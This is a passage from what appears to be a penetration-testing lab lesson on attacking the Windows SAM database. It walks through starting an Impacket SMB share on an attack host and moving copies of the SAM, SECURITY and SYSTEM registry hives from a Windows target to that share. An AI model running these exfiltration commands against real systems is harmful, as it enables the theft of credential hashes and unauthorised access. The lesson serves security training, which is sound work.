#### Creating a Share with smbserver.py

All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (`CompData`) and specify the directory on our attack host where the share will be storing the hive copies (`/home/ltnbob/Documents`). Know that the `smb2support` option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host. Newer versions of Windows do not support SMBv1 by default because of the [numerous severe vulnerabilites](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) and publicly available exploits.

  Attacking SAM

```shell-session
pepedavidphone@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Once we have the share running on our attack host, we can use the `move` command on the Windows target to move the hive copies to the share.

#### Moving Hive Copies to Share

  Attacking SAM

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```